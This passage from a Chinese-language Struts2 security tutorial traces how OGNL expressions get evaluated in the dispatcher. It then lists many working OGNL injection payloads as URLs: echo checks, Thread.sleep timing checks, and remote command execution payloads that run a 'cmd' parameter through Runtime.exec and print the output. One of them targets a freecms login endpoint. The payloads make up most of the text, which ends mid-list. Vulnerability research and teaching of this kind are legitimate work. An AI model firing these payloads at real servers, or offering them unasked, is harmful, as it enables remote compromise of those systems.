下： 
/** 
     * Executes an action 
     * @throws ServletException 
     */ 
    public void executeAction(HttpServletRequest request, 
HttpServletResponse response, ActionMapping mapping) throws 
第 121 页 
ServletException { 
        dispatcher.serviceAction(request, response, servletContext, 
mapping); 
    } 
Dispatcher 应该是再熟悉不过了，因为刚才已经在 dispatcher 里面转悠了一圈回来。现
在调用的是 dispatcher 的 serviceAction 方法。 
public void serviceAction(参数在上面executeAction太长了就不写了)： 
Excute在excuteorg.apache.struts2.dispatcher.ServletRedirectResult
类，具体方法如下： 
public void execute(ActionInvocation invocation) throws Exception { 
        if (anchor != null) { 
            anchor = conditionalParse(anchor, invocation); 
        } 
        super.execute(invocation); 
    } 
super.execute(org.apache.struts2.dispatcher.StrutsResultSupport) 
即执行其父类的 execute 方法。上面的 anchor 为空。 
第 122 页 
重点就在 translateVariables（翻译变量的时候把我们的 Ognl 执行了）： 
第 123 页 
Object result = parser.evaluate(openChars, expression, ognlEval, 
maxLoopCount); 
        return conv.convertValue(stack.getContext(), result, asType); 
最终执行： 
F8 放过页面输出[/ok]： 
解密 Struts2 的“神秘”的 POC： 
第 124 页 
在 S2-016 出来之后 Struts2 以前的 POC 拿着也没什么用了，因为 S2-016 的威力已经大
到让百度、企鹅、京东叫唤了。挑几个简单的具有代表性的讲下。在连续不断的看了这么多
坑爹的概念以后不妨见识一下 Struts2 的常用 POC。 
回显 POC(快速检测是否存在（有的 s2 版本无法输出）,看见输出[/ok]就表示存在)： 
POC1: 
http://127.0.0.1/Struts2/test.action? 
('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b) 
(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c') 
(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g) 
(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2) 
(('\43xman.getWriter().println(%22[/ok]%22)')(d))&(i99) 
(('\43xman.getWriter().close()')(d)) 
POC2（类型转换漏洞需要把 POC 加在整型参数上）: 
http://127.0.0.1/Struts2/test.action?id= 
'%2b( 
%23_memberAccess[%22allowStaticMethodAccess%22]=true, 
@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22) 
)%2b' 
POC3（需要注意这里也必须是加载一个 String(字符串类型)的参数后面，使用的时候把 URL
里面的两个 foo 替换成目标参数（注意 POC 里面还有个 foo））: 
http://127.0.0.1/Struts2/hello.action?foo= 
(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Bool
ean(false), 
%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(true), 
@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22) 
)&z[(foo)('meh')]=true 
POC4: 
http://127.0.0.1/Struts2/hello.action? 
class.classLoader.jarPath=( 
%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Bool
ean(false), 
%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true, 
%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(), 
%23s3cur1ty.println(%22[/ok]%22), 
%23s3cur1ty.close() 
)(aa)&x[(class.classLoader.jarPath)('aa')] 
POC5: 
第 125 页 
http://127.0.0.1/Struts2/hello.action? 
a=1${ 
%23_memberAccess[%22allowStaticMethodAccess%22]=true, 
%23response=@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%2
2[/ok]%22 
),%23response.close()} 
POC6: 
http://127.0.0.1/Struts2/ 
$%7B%23_memberAccess[%22allowStaticMethodAccess%22]=true, 
%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(), 
%23resp.println(%22[ok]%22),%23resp.close()%7D 
.action 
POC7: 
http://localhost/Struts2/test.action? 
redirect:${ 
%23w%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWrit
er(),%23w.println('[/ok]'), 
%23w.flush(),%23w.close() 
} 
@org.apache.struts2.ServletActionContext@getResponse().getWriter().println(%22[/ok]%22)
其实是静态调用 ServletActionContext 上面已经讲过了 ServletActionContext 能够拿到真正的
HttpServletRequest、HttpServletResponse、ServletContext 忘记了的回头看去。拿到一个
HttpServletResponse 响应对象后就可以调用 getWriter 方法(返回的是 PrintWriter)让 Servlet
容器上输出[/ok]了，而其他的 POC 也都做了同样的事：拿到 HttpServletResponse，然后输
出[/ok]。其中的 allowStaticMethodAccess 在 Struts2 里面默认是 false，也就是默认不允许静
态方法调用。 
精确判断是否存在（延迟判断）: 
POC1:  
http://127.0.0.1/Struts2/test.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)
(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_me
mberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(d)(('@java.lang.Thre
ad@sleep(5000)')(d))  
POC2:  
http://127.0.0.1/Struts2/test.action?id='%2b(%23_memberAccess[%22allowStaticMethodAccess
%22]=true,@java.lang.Thread@sleep(5000))%2b'  
第 126 页 
POC3:  
http://127.0.0.1/Struts2/hello.action?foo=%28%23context[%22xwork.MethodAccessor.denyMeth
odExecution%22]%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess[%22allowSt
aticMethodAccess%22]%3d+new+java.lang.Boolean%28true%29,@java.lang.Thread@sleep(5000
))(meh%29&z[%28foo%29%28%27meh%27%29]=true  
POC4：  
http://127.0.0.1/Struts2/hello.action?class.classLoader.jarPath=(%23context%5b%22xwork.Metho
dAccessor.denyMethodExecution%22%5d%3d+new+java.lang.Boolean(false)%2c+%23_memberA
ccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c+%23a%3d%40java.lang.Thread@sle
ep(5000))(aa)&x[(class.classLoader.jarPath)('aa')]  
POC5：  
http://127.0.0.1/Struts2/hello.action?a=1${%23_memberAccess[%22allowStaticMethodAccess%2
2]=true,@java.lang.Thread@sleep(5000)}  
POC6: 
http://127.0.0.1/Struts2/${%23_memberAccess[%22allowStaticMethodAccess%22]=true,@java.la
ng.Thread@sleep(5000)}.action 
之前很多的利用工具都是让线程睡一段时间再去计算时间差来判断漏洞是否存在。这样
比之前的回显更靠谱，缺点就是慢。而实现这个 POC 的方法同样是非常的简单其实就是静
态调用 java.lang.Thread.sleep(5000)就行了。而命令执行原理也是一样的。 
命令执行 POC： 
关于回显：webStr\75new\40byte[100] 修改为合适的长度。  
POC1:  
http://127.0.0.1/Struts2/test.action? 
('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b) 
(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c') 
(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g) 
(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(h) 
(('\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter(%22cmd%2
2))')(d))&(i) 
(('\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())'
)(d))&(i01) 
(('\43webStr\75new\40byte[100]')(d))&(i1) 
第 127 页 
(('\43webRootzproreader.readFully(\43webStr)')(d))&(i111) 
('\43webStr12\75new\40java.lang.String(\43webStr)')(d))&(i2) 
(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2) 
(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95) 
(('\43xman.getWriter().println(\43webStr12)')(d))&(i99) 
(('\43xman.getWriter().close()')(d))& 
cmd=cmd%20/c%20ipconfig  
POC2:  
http://127.0.0.1/Struts2/test.action?id= 
'%2b(%23_memberAccess[%22allowStaticMethodAccess%22]=true, 
%23req=@org.apache.struts2.ServletActionContext@getRequest(), 
%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)), 
%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()), 
%23buffer=new%20byte[100],%23iswinreader.readFully(%23buffer), 
%23result=new%20java.lang.String(%23buffer), 
%23response=@org.apache.struts2.ServletActionContext@getResponse(), 
%23response.getWriter().println(%23result) 
)%2b'& 
cmd=cmd%20/c%20ipconfig  
POC3:  
http://127.0.0.1/freecms/login_login.do? 
user.loginname=( 
%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boole
an(false), 
%23_memberAccess[%22allowStaticMethodAccess%22]=new%20java.lang.Boolean(true), 
%23req=@org.apache.struts2.ServletActionContext@getRequest(), 
%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)), 
%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()), 
%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer), 
%23result=new%20java.lang.String(%23buffer), 
%23response=@org.apache.struts2.ServletActionContext@getResponse(), 
%23response.getWriter().println(%23result) 
)&z[(user.loginname)('meh')]=true& 
cmd=cmd%20/c%20set 
POC4:  
http://127.0.0.1/Struts2/test.action? 
class.classLoader.jarPath=( 
第 128 页 
%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d=+new+java.lang.Bool
ean(false), 
%23_memberAccess%5b%22allowStaticMethodAccess%22%5d=true, 
%23req=@org.apache.struts2.ServletActionContext@getRequest(), 
%23a=%40java.lang.Runtime%40getRuntime().exec(%23req.getParameter(%22cmd%22)).getInpu
tStream(), 
%23b=new+java.io.InputStreamReader(%23a), 
%23c=new+java.io.BufferedReader(%23b), 
%23d=new+char%5b50000%5d,%23c.read(%23d), 
%23s3cur1ty=%40org.apache.struts2.ServletActionContext%40getResponse().getWriter(), 
%23s3cur1ty.println(%23d), 
%23s3cur1ty.close())(aa)&x[(class.classLoader.jarPath)('aa')]& 
cmd=cmd%20/c%20netstat%20-an  
POC5：  
http://127.0.0.1/Struts2/hello.action?a= 
1${%23_memberAccess[%22allowStaticMethodAccess%22]=true, 
%23req=@org.apache.struts2.ServletActionContext@getRequest(), 
%23exec=@java.lang.Runtime@getRuntime().exec(%23req.getParameter(%22cmd%22)), 
%23iswinreader=new%20java.io.DataInputStream(%23exec.getInputStream()), 
%23buffer=new%20byte[1000],%23iswinreader.readFully(%23buffer), 
%23result=new%20java.lang.String(%23buffer), 
%23response=@org.apache.struts2.ServletActionContext@getResponse(), 
%23response.getWriter().println(%23result), 
%23response.close()}& 
cmd=cmd%20/c%20set 
POC7: 